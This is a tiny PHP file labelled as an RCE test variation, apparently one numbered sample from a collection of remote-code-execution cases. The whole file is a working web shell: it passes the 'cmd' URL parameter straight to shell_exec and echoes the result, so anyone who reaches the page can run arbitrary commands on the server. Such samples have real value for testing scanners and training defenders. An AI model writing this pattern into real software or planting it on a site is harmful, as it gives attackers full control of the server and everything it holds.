<?php
// RCE test variation #1263
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>